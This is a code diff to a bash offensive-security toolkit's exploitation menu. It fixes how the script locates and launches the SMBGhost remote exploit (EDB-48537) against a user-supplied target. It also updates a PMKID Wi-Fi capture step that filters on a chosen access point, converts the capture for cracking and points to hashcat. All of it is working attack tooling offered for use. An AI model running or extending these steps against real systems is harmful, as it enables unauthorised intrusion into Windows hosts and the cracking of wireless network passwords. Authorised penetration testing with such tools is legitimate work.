@@ -442,7 +442,16 @@ exploitation() {
                     ;;
                 3)
                     echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching SMBGhost exploit...${RESET}"
-                    python3 /usr/share/exploitdb/exploits/windows/remote/48537.py "$target"
+                    # exploit-db install paths vary between Kali releases, so resolve the
+                    # script location with searchsploit instead of hardcoding it.
+                    local smbghost_path
+                    smbghost_path="$(searchsploit -p 48537 2>/dev/null | awk -F': *' '/Path:/{print $2; exit}')"
+                    [ -f "$smbghost_path" ] || smbghost_path="/usr/share/exploitdb/exploits/windows/remote/48537.py"
+                    if [ -f "$smbghost_path" ]; then
+                        python3 "$smbghost_path" "$target"
+                    else
+                        echo -e "${DEBIAN_RED}${BOLD}[✗] EDB-48537 not found. Install exploitdb: sudo apt install exploitdb${RESET}"
+                    fi
                     ;;
                 4)
                     echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
@@ -572,11 +581,20 @@ exploitation() {
                     read -r interface
                     echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
                     read -r bssid
-                    # Restrict the capture to the chosen BSSID via a filter file.
-                    echo "$bssid" > /tmp/eoz_pmkid_filter.txt
+                    # hcxdumptool 6.3.0+/7.x dropped --filterlist_ap/--filtermode/-o/--enable_status.
+                    # Filtering is now done with a compiled Berkeley Packet Filter (--bpf),
+                    # output is -w, and the live status display is --rds. hcxdumptool also
+                    # manages the interface itself, so do NOT put the card into monitor mode.
+                    local bssid_raw bpf_file="/tmp/eoz_pmkid_filter.bpf"
+                    bssid_raw="$(echo "$bssid" | tr -d ':-' | tr 'A-F' 'a-f')"
                     echo -e "${HYPR_YELLOW}${BOLD}[*] Capturing for 60s (Ctrl+C to stop early)...${RESET}"
-                    timeout 60 hcxdumptool -i "$interface" -w "pmkid.pcapng" --filterlist_ap=/tmp/eoz_pmkid_filter.txt --filtermode=2 2>/dev/null \
-                        || hcxdumptool -i "$interface" -o "pmkid.pcapng" --enable_status=1
+                    if hcxdumptool --bpfc="wlan addr3 ${bssid_raw}" > "$bpf_file" 2>/dev/null && [ -s "$bpf_file" ]; then
+                        timeout 60 hcxdumptool -i "$interface" -w "pmkid.pcapng" --bpf="$bpf_file" --rds=1 \
+                            || timeout 60 hcxdumptool -i "$interface" -w "pmkid.pcapng" --rds=1
+                    else
+                        echo -e "${DEBIAN_RED}${BOLD}[!] BPF filter failed; capturing all APs.${RESET}"
+                        timeout 60 hcxdumptool -i "$interface" -w "pmkid.pcapng" --rds=1
+                    fi
                     hcxpcapngtool -o "pmkid_hash" "pmkid.pcapng"
                     echo -e "${DEBIAN_GREEN}${BOLD}[✓] PMKID saved to pmkid_hash. Use hashcat -m 22000 to crack it.${RESET}"
                     ;;
